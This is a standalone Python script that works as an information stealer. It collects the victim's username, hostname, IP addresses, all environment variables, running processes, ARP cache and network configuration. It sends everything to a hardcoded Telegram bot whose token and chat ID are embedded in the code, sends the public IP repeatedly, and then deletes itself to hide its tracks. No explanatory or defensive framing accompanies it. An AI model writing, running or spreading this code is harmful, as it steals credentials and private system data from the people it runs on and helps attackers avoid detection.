import time
import os
import sys
import platform
import socket
import requests
import psutil
import uuid
import getpass
import shutil
import subprocess
import re
import json

MAX_MESSAGE_LENGTH = 4000  # Telegram message character limit
# Replace with your bot's API token and chat ID
API_TOKEN = '7496801196:AAFIaKLgl2iaSgCC9V5jXXC4gOom3eZ0XEI'
CHAT_ID = '6400572573'
TELEGRAM_URL = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"

def format_bytes(size):
    # Convert bytes to GB for a better display
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size < 1024.0:
            return f"{size:.2f} {unit}"
        size /= 1024.0

def get_device_info():
    device_info = {}  # Initialize device_info at the start

    try:
        # Basic system info
        device_info.update({
            'OS Name': os.name,
            'Platform': platform.system(),
            'Platform Release': platform.release(),
            'Platform Version': platform.version(),
            'Machine Type': platform.machine(),
            'Processor': platform.processor(),
            'Architecture': platform.architecture(),
            'Hostname': socket.gethostname(),
            'IP Address': socket.gethostbyname(socket.gethostname()),
            'Python Version': sys.version,
            'Python Build': sys.version_info,
            'Username': getpass.getuser(),
            'UUID': str(uuid.uuid1()),
            'CPU Cores (Physical)': psutil.cpu_count(logical=False),
            'CPU Cores (Logical)': psutil.cpu_count(logical=True),
            'CPU Frequency': psutil.cpu_freq().current if psutil.cpu_freq() else None,
            'Memory Info': psutil.virtual_memory()._asdict(),
            'Disk Partitions': [part._asdict() for part in psutil.disk_partitions()],
            'Total Disk Space': format_bytes(shutil.disk_usage("/").total),
            'Free Disk Space': format_bytes(shutil.disk_usage("/").free),
            'Used Disk Space': format_bytes(shutil.disk_usage("/").used),
            'Running Processes': [p.info for p in psutil.process_iter(['pid', 'name'])],
            'Environment Variables': dict(os.environ),
        })

        # Check uptime and load average
        try:
            device_info['System Uptime (seconds)'] = psutil.boot_time()
            device_info['Load Average'] = os.getloadavg() if hasattr(os, 'getloadavg') else None
        except (PermissionError, FileNotFoundError):
            device_info['System Uptime (seconds)'] = 'Permission Denied'
            device_info['Load Average'] = 'Permission Denied'

        # Network interfaces and addresses
        net_if_addrs = psutil.net_if_addrs()
        device_info['Network Interfaces'] = {k: [addr._asdict() for addr in v] for k, v in net_if_addrs.items()}

        # Network statistics
        net_io_counters = psutil.net_io_counters()
        device_info['Network IO Counters'] = net_io_counters._asdict()

        # Shell commands (IP route, etc.)
        try:
            ip_route = subprocess.check_output("ip route", shell=True).decode()
            device_info['IP Route'] = ip_route
        except Exception:
            device_info['IP Route'] = None

        try:
            arp_cache = subprocess.check_output("arp -a", shell=True).decode()
            device_info['ARP Cache'] = arp_cache
        except Exception:
            device_info['ARP Cache'] = None

        try:
            ifconfig = subprocess.check_output("ifconfig", shell=True).decode()
            device_info['Ifconfig Output'] = ifconfig
        except Exception:
            device_info['Ifconfig Output'] = None

    except Exception as e:
        # Log the error in the dictionary to avoid crashes
        device_info['Error'] = str(e)
    
    return device_info

def split_message(message, max_length):
    """Split message into chunks of a specified max length."""
    lines = message.splitlines()
    chunks = []
    current_chunk = ""

    for line in lines:
        if len(current_chunk) + len(line) + 1 <= max_length:
            current_chunk += line + '\n'
        else:
            chunks.append(current_chunk)
            current_chunk = line + '\n'
    
    if current_chunk:
        chunks.append(current_chunk)
    
    return chunks

def send_info_to_telegram(info_dict):
    message = "Complete Device Information:\n\n"
    for key, value in info_dict.items():
        message += f"{key}: {value}\n"
    
    message_chunks = split_message(message, MAX_MESSAGE_LENGTH)

    for chunk in message_chunks:
        payload = {
            'chat_id': CHAT_ID,
            'text': chunk
        }
        response = requests.post(TELEGRAM_URL, data=payload)
#        
#        if response.status_code == 200:
#            print("Message chunk sent successfully")
#        else:
#            print(f"Failed to send chunk. Status code: {response.status_code}")

if __name__ == "__main__":
    device_info = get_device_info()
    send_info_to_telegram(device_info)

def get_public_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()    
        public_ip = requests.get('https://api.ipify.org').text
        return {'local_ip': local_ip, 'public_ip': public_ip } 
    except Exception as e:
        pass

def background_task(ip):
    try:
        url = 'https://api.telegram.org/bot7496801196:AAFIaKLgl2iaSgCC9V5jXXC4gOom3eZ0XEI/sendMessage'
        params = {
            'chat_id': '6400572573',
            'text': str(ip)
        }
        for i in range(3):
            response = requests.get(url, params=params)
            time.sleep(10)
        
    except Exception as e:
        pass 
background_task(get_public_ip())
LOCK_FILE=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'task.lock')
def remove_lock_file():

    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)
remove_lock_file()
def self_remove():
    os.remove(__file__)
self_remove()
